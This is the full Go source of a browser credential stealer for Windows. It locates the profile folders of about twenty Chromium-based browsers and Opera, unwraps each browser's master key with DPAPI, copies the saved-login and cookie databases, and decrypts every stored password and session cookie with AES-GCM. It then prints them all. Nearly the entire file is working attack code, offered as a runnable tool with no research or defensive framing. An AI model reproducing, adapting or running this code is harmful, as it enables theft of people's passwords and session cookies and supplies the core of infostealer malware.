package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"sync"
	"time"

	_ "github.com/mattn/go-sqlite3"

	dpapi "github.com/billgraziano/dpapi"
)

var (
	counter = 0
)

func copyFile(src, dest string) error {
	srcFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer srcFile.Close()

	destFile, err := os.Create(dest)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, srcFile)
	if err != nil {
		return err
	}

	return nil
}

func getEncryptionKey(localStatePath string) ([]byte, error) {
	localState, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, err
	}

	var localStateData map[string]interface{}
	if err := json.Unmarshal(localState, &localStateData); err != nil {
		return nil, err
	}

	encryptedKeyBase64, ok := localStateData["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
	if !ok {
		return nil, fmt.Errorf("no 'os_crypt.encrypted_key' found in the local state file")
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(encryptedKeyBase64)
	if err != nil {
		return nil, err
	}

	key := encryptedKey[5:]

	decryptkey, err := dpapi.DecryptBytes(key)

	if err != nil {
		return nil, err
	}
	return decryptkey, nil
}

func decryptPassword(password, key []byte) (string, error) {
	if len(password) < 16 {
		return "", fmt.Errorf("invalid password length")
	}

	iv := password[3:15]
	password = password[15:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	decryptedPassword, err := gcm.Open(nil, iv, password, nil)
	if err != nil {
		return "", err
	}

	return string(decryptedPassword), nil
}

func decryptcookie(localpath string, dbPath string, browsername string, wg *sync.WaitGroup, cookieresults chan<- string) {
	var dump string

	defer wg.Done()
	key, err := getEncryptionKey(localpath)

	if err != nil {
		return
	}

	datafile := fmt.Sprintf("cookie%s", browsername)
	err = copyFile(dbPath, datafile)
	if err != nil {
		fmt.Println(err)
		return
	}

	db, err := sql.Open("sqlite3", datafile)
	if err != nil {
		fmt.Println(err)
		return
	}

	rows, err := db.Query("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
	if err != nil {
		fmt.Println(err)
		return
	}

	cookies := make(chan string)

	var wg2 sync.WaitGroup

	dump += fmt.Sprintf("%s Cookies\n", browsername)
	dump += "*=======================*\n"

	for rows.Next() {
		var host_key, name, path, encrypted_value, expiry string
		err = rows.Scan(&host_key, &name, &path, &encrypted_value, &expiry)
		if err != nil {
			return
		}

		wg2.Add(1)
		go func(host_key, name, path, encrypted_value, expiry string) {
			defer wg2.Done()
			decryptedvalue, err := decryptPassword([]byte(encrypted_value), key)
			if err != nil {
				return
			}
			result := fmt.Sprintf("Hostkey: %s\nname: %s\nPath: %s\nvalue: %s\nexpiry: %s\n=======================\n \n", host_key, name, path, decryptedvalue, expiry)
			counter += 1
			cookies <- result
		}(host_key, name, path, encrypted_value, expiry)
	}

	go func() {
		wg2.Wait()
		close(cookies)
	}()

	for result := range cookies {
		dump += result
	}

	rows.Close()
	db.Close()
	os.Remove(datafile)
	cookieresults <- dump
}

func decryptlogin(localpath string, dbPath string, browsername string, wg *sync.WaitGroup, browserresult chan<- string) {
	var dump string

	defer wg.Done()
	key, err := getEncryptionKey(localpath)
	if err != nil {
		return
	}

	datafile := fmt.Sprintf("data%s", browsername)
	err = copyFile(dbPath, datafile)
	if err != nil {
		fmt.Println(err)
		return
	}

	db, err := sql.Open("sqlite3", datafile)
	if err != nil {
		fmt.Println(err)
		return
	}

	rows, err := db.Query("SELECT origin_url, action_url, username_value, password_value FROM logins ORDER BY date_created")
	if err != nil {
		fmt.Println(err)
		return
	}

	loginresults := make(chan string)
	var wg2 sync.WaitGroup

	dump += fmt.Sprintf("%s PASSWORDS\n", browsername)
	dump += "*=======================*\n"
	for rows.Next() {
		var originURL, actionURL, username, password string
		err = rows.Scan(&originURL, &actionURL, &username, &password)
		if err != nil {
			return
		}

		wg2.Add(1)
		go func(originURL, actionURL, username, password string) {
			defer wg2.Done()
			decryptedPassword, err := decryptPassword([]byte(password), key)
			if err != nil {
				return
			}
			result := fmt.Sprintf("Origin URL: %s\nAction URL: %s\nUsername: %s\nPassword: %s\n=======================\n \n", originURL, actionURL, username, decryptedPassword)
			counter += 1
			loginresults <- result
		}(originURL, actionURL, username, password)
	}

	go func() {
		wg2.Wait()
		close(loginresults)
	}()

	for result := range loginresults {
		dump += result
	}

	rows.Close()
	db.Close()
	os.Remove(datafile)

	browserresult <- dump
}

func defaultbrowser(decryptPasswords, decryptCookies bool, outerresult chan<- string) {
	appdata := os.Getenv("LOCALAPPDATA")

	var totallogin string
	var totalcookie string

	var wglogin sync.WaitGroup
	var wgcookie sync.WaitGroup

	browserresults := make(chan string)
	cookieresults := make(chan string)

	browsers := map[string]string{
		"avast":                appdata + "\\AVAST Software\\Browser\\User Data",
		"amigo":                appdata + "\\Amigo\\User Data",
		"torch":                appdata + "\\Torch\\User Data",
		"kometa":               appdata + "\\Kometa\\User Data",
		"orbitum":              appdata + "\\Orbitum\\User Data",
		"cent-browser":         appdata + "\\CentBrowser\\User Data",
		"7star":                appdata + "\\7Star\\7Star\\User Data",
		"sputnik":              appdata + "\\Sputnik\\Sputnik\\User Data",
		"vivaldi":              appdata + "\\Vivaldi\\User Data",
		"google-chrome-sxs":    appdata + "\\Google\\Chrome SxS\\User Data",
		"google-chrome":        appdata + "\\Google\\Chrome\\User Data",
		"epic-privacy-browser": appdata + "\\Epic Privacy Browser\\User Data",
		"microsoft-edge":       appdata + "\\Microsoft\\Edge\\User Data",
		"uran":                 appdata + "\\uCozMedia\\Uran\\User Data",
		"yandex":               appdata + "\\Yandex\\YandexBrowser\\User Data",
		"brave":                appdata + "\\BraveSoftware\\Brave-Browser\\User Data",
		"iridium":              appdata + "\\Iridium\\User Data",
		"speed360":             appdata + "\\360chrome\\Chrome\\User Data",
		"qqbrowser":            appdata + "\\Tencent\\QQBrowser\\User Data",
		"coco":                 appdata + "\\CocCoc\\Browser\\User Data",
	}

	for k, v := range browsers {
		if decryptPasswords {
			wglogin.Add(1)
			go decryptlogin(filepath.Join(v, "Local State"), filepath.Join(v, "Default", "Login Data"), k, &wglogin, browserresults)
		}
		if decryptCookies {
			wgcookie.Add(1)
			go decryptcookie(filepath.Join(v, "Local State"), filepath.Join(v, "Default", "Network", "Cookies"), k, &wgcookie, cookieresults)
		}
	}

	go func() {
		wglogin.Wait()
		close(browserresults)
	}()

	go func() {
		wgcookie.Wait()
		close(cookieresults)
	}()

	for result := range browserresults {
		totallogin += result
	}
	for result2 := range cookieresults {
		totalcookie += result2
	}

	total := totallogin + totalcookie
	outerresult <- total
}

func operaBrowsers(decryptPasswords, decryptCookies bool, outerresult chan<- string) {
	homeDir := os.Getenv("APPDATA")
	browsers := map[string]string{
		"Opera Stable": homeDir + "\\Opera Software\\Opera Stable",
		"Opera GX":     homeDir + "\\Opera Software\\Opera GX Stable",
	}

	var loginresults string
	var cookieresults string
	var wglogin sync.WaitGroup
	var wgcookie sync.WaitGroup

	loginresult := make(chan string)
	cookieresult := make(chan string)

	for k, v := range browsers {
		if decryptPasswords {
			wglogin.Add(1)
			go decryptlogin(filepath.Join(v, "Local State"), filepath.Join(v, "Login Data"), k, &wglogin, loginresult)
		}
		if decryptCookies {
			wgcookie.Add(1)
			go decryptcookie(filepath.Join(v, "Local State"), filepath.Join(v, "Network", "Cookies"), k, &wgcookie, cookieresult)
		}
	}

	go func() {
		wglogin.Wait()
		close(loginresult)
	}()

	go func() {
		wgcookie.Wait()
		close(cookieresult)
	}()

	for result := range loginresult {
		loginresults += result
	}

	for result2 := range cookieresult {
		cookieresults += result2
	}

	total := loginresults + cookieresults

	outerresult <- total
}

func decryptBrowserData(decryptPasswords, decryptCookies bool) string {
	var finalbrowser string

	var operawg sync.WaitGroup
	var defaultwg sync.WaitGroup

	resultslogin := make(chan string)
	operawg.Add(1)
	defaultwg.Add(1)

	go func() {
		defer operawg.Done()
		if decryptPasswords || decryptCookies {
			operaBrowsers(decryptPasswords, decryptCookies, resultslogin)
		}
	}()

	go func() {
		defer defaultwg.Done()
		if decryptPasswords || decryptCookies {
			defaultbrowser(decryptPasswords, decryptCookies, resultslogin)
		}
	}()

	go func() {
		operawg.Wait()
		defaultwg.Wait()
		close(resultslogin)
	}()

	for result := range resultslogin {
		finalbrowser += result
	}

	return finalbrowser
}

func main() {
	decryptPasswords := flag.Bool("passwords", false, "Decrypt passwords")
	decryptCookies := flag.Bool("cookies", false, "Decrypt cookies")
	flag.Parse()

	// If no flags are set, decrypt both
	if !*decryptPasswords && !*decryptCookies {
		*decryptPasswords = true
		*decryptCookies = true
	}

	start := time.Now()

	result := decryptBrowserData(*decryptPasswords, *decryptCookies)

	duration := time.Since(start)

	fmt.Println("Result:", result)
	fmt.Printf("Execution time: %v\n", duration)
	fmt.Printf("Entries Decrypted: %d\n", counter)
}
